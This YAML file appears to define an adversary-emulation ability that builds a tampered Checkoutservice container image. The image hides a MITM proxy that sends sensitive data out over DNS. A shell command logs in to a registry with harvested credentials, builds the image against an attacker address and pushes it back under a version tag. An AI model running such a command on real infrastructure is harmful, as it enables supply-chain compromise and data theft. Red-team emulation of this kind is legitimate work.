- id: 20000000-0000-0000-0000-000000000005
  name: Modify container Checkoutservice
  description: Image modification of Checkoutservice with internally an invisible proxy (MITM) that send sensitive info by DNS.
  tactic: privilege-escalation
  technique: { attack_id: T1543.005, name: Container Service }
  repeatable: false
  singleton: true
  platforms:
    linux: { sh: { command: "sleep $W205 && docker login $HOSTREGISTRY -u $(cat $DATA_PATH/KC2/user) -p $(cat $DATA_PATH/KC2/pass) && docker build --build-arg EXFIL_DOMAIN=$ATTACKERADDR -f /utils/checkout/Dockerfile -t $HOSTREGISTRY/checkout:2.0.3 /utils/checkout && docker push $HOSTREGISTRY/checkout:2.0.3", timeout: 900 } }